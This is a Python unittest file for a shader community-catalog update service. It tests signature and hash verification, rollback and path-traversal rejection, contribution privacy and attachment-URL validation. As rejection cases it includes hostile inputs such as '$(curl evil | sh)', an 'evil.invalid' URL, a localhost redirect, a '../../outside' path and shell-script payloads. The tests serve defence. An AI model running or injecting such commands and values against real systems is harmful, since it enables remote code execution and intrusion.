"""Protocol/transaction tests. Cryptographic rejection is tested by CatalogTrust."""
import hashlib,json,os,sys,tempfile,time,unittest
from pathlib import Path
from unittest.mock import patch
from paths import ROOT
sys.path.insert(0,str(ROOT/'packaging/macos/native'))
sys.path.insert(0,str(ROOT/'tools'))
import community_catalog as c
import catalog_service as s
import review_community_catalog as review
from test_community_catalog import shader

def row():
    result=shader();result.update(abi=c.EARLY_DEPTH_ABI,key_size=352,runtime_size=288,specialization=bytes(484).hex())
    result['id']=c.identity(result);return result

class CatalogService(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup)
        self.root=Path(self.temp.name);self.resources=self.root/'Resources';self.resources.mkdir()
        self.support=self.root/'Support';self.seed=row()
        c.save(self.resources/'CommunityCatalog.jsonl',{self.seed['id']:self.seed})
        (self.resources/'CommunityCatalogue.pub').write_bytes(bytes(32))
        self.body=(self.resources/'CommunityCatalog.jsonl').read_bytes();self.revision=1
        self.urls=[];self.bad_signature=False
        self.mock=patch.object(s,'helper',side_effect=self.fake_helper);self.mock.start();self.addCleanup(self.mock.stop)
    def manifest(self):
        return dict(format=1,abi=c.EARLY_DEPTH_ABI,revision=self.revision,
                    sha256=hashlib.sha256(self.body).hexdigest(),bytes=len(self.body))
    def fake_helper(self,resources,action,*args):
        # Network is a deterministic local fixture here, not a production bypass.
        if action=='download':
            url,limit,path=args;self.urls.append(url)
            self.assertTrue(url.startswith(s.ORIGIN+'/'))
            data=c.canonical(self.manifest()) if url.endswith('latest.json') else bytes(64) if url.endswith('latest.sig') else self.body
            if len(data)>int(limit):raise ValueError('Download limit')
            Path(path).write_bytes(data);return None
        if self.bad_signature:raise ValueError('Signature rejected')
        if action=='manifest':return c.strict_json(Path(args[1]).read_bytes())
        if action=='verify':
            info=c.strict_json(Path(args[1]).read_bytes());data=Path(args[3]).read_bytes()
            if len(data)!=info['bytes'] or hashlib.sha256(data).hexdigest()!=info['sha256']:raise ValueError('Hash rejected')
            return info
        raise AssertionError(action)
    def test_verified_update_and_tampered_cache_rejected(self):
        report=s.update(self.resources,self.support);self.assertTrue(report['verified'])
        path=s.verified_official(self.resources,self.support);self.assertEqual(path.read_bytes(),self.body)
        self.assertFalse(s.update(self.resources,self.support)['updated'])
        path.write_bytes(b'MZ fake executable')
        with self.assertRaises(ValueError):s.verified_official(self.resources,self.support)
    def test_bad_signature_and_bad_data_never_replace_last_good(self):
        s.update(self.resources,self.support);previous=s.verified_official(self.resources,self.support)
        self.revision=2;self.bad_signature=True
        with self.assertRaises(ValueError):s.update(self.resources,self.support)
        self.bad_signature=False;self.body=b'#!/bin/sh\nmalicious-code\n'
        with self.assertRaises(ValueError):s.update(self.resources,self.support)
        self.assertEqual(s.verified_official(self.resources,self.support),previous)
    def test_rollback_and_generation_path_rejected(self):
        self.revision=2;s.update(self.resources,self.support);self.revision=1
        with self.assertRaisesRegex(ValueError,'rollback'):s.update(self.resources,self.support)
        root=s.official_root(self.support,c.EARLY_DEPTH_ABI)
        s.write_json(root/'current.json',{'generation':'../../outside'})
        with self.assertRaises(ValueError):s.verified_official(self.resources,self.support)
    def test_optional_daily_check_retains_local_data_offline(self):
        with patch.object(s,'update',side_effect=ValueError('offline')) as update:
            self.assertTrue(s.refresh(self.resources,self.support)['bundled_catalogue_preserved'])
            self.assertTrue(s.refresh(self.resources,self.support)['cached']);self.assertEqual(update.call_count,1)
    def test_contribution_only_new_data_and_no_preferences(self):
        new=row();new['flat'][0]=99;new['id']=c.identity(new)
        directory=self.support/'Community/contributions';directory.mkdir(parents=True)
        c.save(directory/(c.EARLY_DEPTH_ABI+'.jsonl'),{self.seed['id']:self.seed,new['id']:new})
        (self.support/'preferences.json').write_text('PRIVATE_BOOKMARK_TOKEN')
        report=s.prepare_contribution(self.resources,self.support);path=Path(report['file'])
        self.assertEqual(report['new_records'],1);self.assertEqual(set(c.load(path)),{new['id']})
        self.assertNotIn('PRIVATE_BOOKMARK_TOKEN',path.read_text());self.assertEqual(path.stat().st_mode&0o777,0o600)
        self.assertEqual(review.validate(path),c.load(path))
    def test_empty_discoveries_do_not_prepare_submission(self):
        self.assertTrue(s.prepare_contribution(self.resources,self.support)['empty'])
    def test_attacker_urls_and_commands_are_never_used(self):
        good='https://github.com/user-attachments/files/123/GOW3-'+'a'*20+'.txt'
        self.assertEqual(review.attachment_url('[file]('+good+')'),good)
        for bad in ['https://evil.invalid/a.txt','file:///tmp/evil',good+'.exe',good+'?x=1',good+'#x',good+' '+good.replace('/123/','/456/'),'$(curl evil | sh)']:
            with self.subTest(bad=bad),self.assertRaises(ValueError):review.attachment_url(bad)
        with self.assertRaises(ValueError):review.RestrictedRedirect().redirect_request(None,None,302,'',{},'http://127.0.0.1/secret')
    def test_executables_duplicate_fields_nonfinite_and_devices_rejected(self):
        path=self.root/'incoming.txt'
        for data in [b'MZ'+bytes(128),b'PK\x03\x04 archive',b'#!/bin/sh\necho pwned',c.canonical(c.GAME)+b'\n{"kind":"shader","kind":"pipeline"}\n',b'{"format":NaN}\n']:
            path.write_bytes(data)
            with self.assertRaises(ValueError):c.load(path)
        fifo=self.root/'fifo';os.mkfifo(fifo)
        with self.assertRaises(ValueError):c.load(fifo)
        bad=row();bad['hardware_stage']=True;bad['id']=c.identity(bad)
        with self.assertRaises(ValueError):c.validate(bad)

if __name__=='__main__':unittest.main()
